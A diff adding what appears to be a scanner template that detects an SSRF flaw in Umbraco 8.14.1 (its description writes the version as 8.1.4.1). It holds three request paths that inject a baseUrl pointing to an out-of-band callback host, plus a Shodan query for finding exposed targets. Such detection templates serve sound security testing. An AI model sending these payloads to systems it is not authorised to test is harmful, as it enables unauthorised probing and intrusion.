@@ -1,0 +1,41 @@
+id: umbraco-base-ssrf
+
+info:
+  name: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
+  author: dhiyaneshDk
+  severity: medium
+  description: Umbraco 8.1.4.1 allows attackers to use the baseUrl parameter to several programs to perform a server-side request forgery (SSRF) attack.
+  reference:
+    - https://www.exploit-db.com/exploits/50462
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 6.8
+    cwe-id: CWE-918
+  metadata:
+    verified: true
+    shodan-query: http.html:"Umbraco"
+  tags: ssrf,umbraco,oast
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
+      - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/'
+      - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
+
+    stop-at-first-match: true
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: dsl
+        dsl:
+          - "len(body_1)==0"
+          - "len(body_2)==0"
+          - "len(body_3)==0"
+
+# Enhanced by cs 08/03/2022
